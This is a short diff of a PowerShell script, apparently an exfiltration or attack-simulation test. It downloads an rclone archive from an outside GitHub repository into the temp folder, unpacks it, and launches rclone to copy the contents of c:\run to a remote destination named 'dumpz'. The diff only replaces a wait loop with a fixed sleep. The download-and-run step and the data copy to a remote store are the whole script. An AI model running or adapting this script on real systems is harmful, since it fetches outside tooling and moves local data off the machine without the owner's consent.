@@ -1,14 +1,7 @@
 cd $env:temp
 curl https://github.com/d77juan/t3st1n6/raw/main/rclone.zip -o rclone.zip
-Expand-Archive .\rclone.zip  .
-while ($retry) {
-  if(Test-Path .\rclone.exe) {
-    $retry = $False
-  } else {
-    echo "   - waiting..."
-    sleep 1
-  }
-}
+Expand-Archive .\rclone.zip .
+sleep 1
 echo .\rclone.exe copy c:\run remote:dumpz 
 Start-Process -FilePath ".\rclone.exe" -ArgumentList " copy c:\run remote:dumpz"
 
